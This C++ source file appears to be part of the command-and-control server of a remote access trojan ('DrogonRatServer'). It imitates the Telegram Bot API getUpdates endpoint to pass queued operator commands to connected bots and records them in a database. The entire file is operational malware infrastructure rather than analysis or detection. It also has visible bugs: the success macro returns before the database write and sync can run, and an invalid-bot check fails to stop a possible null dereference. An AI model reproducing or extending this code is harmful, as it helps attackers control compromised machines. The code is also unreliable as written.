#include "DrogonRatServer/Handler.hpp"
#include <drogon/HttpResponse.h>
#include <mutex>

#define getUpdate_FUNCTION_SIGNATURE                                                               \
    DrogonRatServer::Bot *p_Bot, const std::string &arg_Token,                                     \
        const drogon::orm::DbClientPtr &p_Db,                                                      \
        DrogonRatServer::HttpResponseCallback &&arg_Callback,                                      \
        DrogonRatServer::Handler &Caller_Handler

#define SEND_ERROR_RESPONSE(arg_Callback, arg_Status, arg_Message)                                 \
    do {                                                                                           \
        Json::Value error;                                                                         \
        error["ok"] = false;                                                                       \
        error["description"] = (arg_Message);                                                      \
        auto resp = drogon::HttpResponse::newHttpJsonResponse(error);                              \
        resp->setStatusCode((arg_Status));                                                         \
        (arg_Callback)(resp);                                                                      \
        FILE_ERROR_LOG("[SEND_ERROR_RESPONSE] Status: {}, Message: {}", static_cast<int>(arg_Status), arg_Message);  \
        return;                                                                                    \
    } while(0)

#define SEND_SUCCESS_RESPONSE(arg_Callback, Result_Json)                                           \
    do {                                                                                           \
        Json::Value response;                                                                      \
        response["ok"] = true;                                                                     \
        response["result"] = (Result_Json);                                                        \
        auto resp = drogon::HttpResponse::newHttpJsonResponse(response);                           \
        resp->setStatusCode(drogon::k200OK);                                                       \
        (arg_Callback)(resp);                                                                      \
        FILE_INFO_LOG("[SEND_SUCCESS_RESPONSE] Sent update successfully.");                        \
        return;                                                                                    \
    } while(0)

#define SEND_EMPTY_UPDATE_RESPONSE(arg_Callback)                                                   \
    do {                                                                                           \
        auto resp = drogon::HttpResponse::newHttpResponse();                                       \
        resp->setStatusCode(drogon::k200OK);                                                       \
        resp->setContentTypeCode(drogon::CT_TEXT_HTML);                                            \
        resp->setBody(R"({"ok":true,"result":[]})");                                               \
        (arg_Callback)(resp);                                                                      \
        FILE_DEBUG_LOG("[SEND_EMPTY_UPDATE_RESPONSE] No pending updates.");                        \
        return;                                                                                    \
    } while(0)

bool _insertUpdateInDb(const int64_t Bot_Id,
                       const drogon::orm::DbClientPtr &p_Db,
                       const Json::Value &update_json) {
    try {
        const Json::Value &message = update_json["message"];
        const int64_t message_id = message["message_id"].asInt64();
        const std::string &caption = message.get("caption", "").asString();
        const std::string &text = message.get("text", "").asString();

        FILE_DEBUG_LOG("[_insertUpdateInDb] Inserting update for Bot ID: {}, Message ID: {}", Bot_Id, message_id);

        p_Db->execSqlSync("INSERT INTO telegram_message(bot_id, text, caption) VALUES(?, ?, ?)",
                          Bot_Id, text, caption);

        p_Db->execSqlSync("INSERT INTO telegram_update(bot_id, message_id, delivered) VALUES(?, ?, ?)",
                          Bot_Id, message_id, true);

        FILE_INFO_LOG("[_insertUpdateInDb] Successfully inserted update for message ID {}", message_id);
        return true;
    } catch (const std::exception &e) {
        FILE_ERROR_LOG("[_insertUpdateInDb] Failed to insert update: {}", e.what());
        return false;
    }
}

bool _syncShellAndDb(std::shared_ptr<DrogonRatServer::Handler::Shell> &p_Shell,
                     DrogonRatServer::Handler &Caller_Handler) {
    try {
        p_Shell->setUpdateOffset(Caller_Handler.queryUpdateOffset());
        p_Shell->setMessageOffset(Caller_Handler.queryMessageOffset());
        p_Shell->setFileOffset(Caller_Handler.queryFileOffset());
        FILE_DEBUG_LOG("[_syncShellAndDb] Updated offsets");
        return true;
    } catch (const std::exception &e) {
        SHELL_LOG("[ERROR] Failed syncing Shell with DB: {}", e.what());
        FILE_ERROR_LOG("[ERROR] Failed syncing Shell with DB: {}", e.what());
        return false;
    }
}

void DrogonRatServer::TelegramBotApi::handleGetUpdate(getUpdate_FUNCTION_SIGNATURE) {
    FILE_DEBUG_LOG("[handleGetUpdate] Called with token: {}", arg_Token);

    if (!p_Bot || p_Bot->id <= 4) {
        FILE_ERROR_LOG("[handleGetUpdate] Invalid bot (id = {}). Token: {}", p_Bot ? p_Bot->id : 0, arg_Token);
    }

    FILE_DEBUG_LOG("[handleGetUpdate] Bot ID {} is valid. Checking pending updates...", p_Bot->id);

    std::shared_ptr<DrogonRatServer::Handler::Shell> &shell_sptr = Caller_Handler.getShell();
    std::deque<Json::Value> &updates_queue = shell_sptr->getPendingUpdatesQueue();
    std::mutex &updates_queue_mutex = shell_sptr->getPendingUpdatesMutex();

    Json::Value update;

    std::unique_lock<std::mutex> lock(updates_queue_mutex);
    FILE_DEBUG_LOG("[handleGetUpdate] Locked update queue (size = {}).", updates_queue.size());

    try {
        if (updates_queue.empty()) {
            FILE_DEBUG_LOG("[handleGetUpdate] No pending updates for bot ID {}", p_Bot->id);
            SEND_EMPTY_UPDATE_RESPONSE(arg_Callback);
            return;
        }

        update = std::move(updates_queue.front());
        updates_queue.pop_front();
        FILE_DEBUG_LOG("[handleGetUpdate] Popped update from queue. Remaining: {}", updates_queue.size());

        lock.unlock();
        FILE_DEBUG_LOG("[handleGetUpdate] Unlocked update queue mutex.");

        SEND_SUCCESS_RESPONSE(arg_Callback, update);

        FILE_INFO_LOG("[handleGetUpdate] Delivering update to bot {} and saving to DB.", p_Bot->id);
        _insertUpdateInDb(p_Bot->id, p_Db, update);
        _syncShellAndDb(shell_sptr, Caller_Handler);

    } catch (const std::exception &e) {
        FILE_ERROR_LOG("[handleGetUpdate] Exception: {}", e.what());
        SEND_ERROR_RESPONSE(arg_Callback, drogon::k500InternalServerError, "Exception while processing update");
    }
}

#undef getUpdate_FUNCTION_SIGNATURE
#undef SEND_SUCCESS_RESPONSE
#undef SEND_ERROR_RESPONSE
#undef SEND_EMPTY_UPDATE_RESPONSE
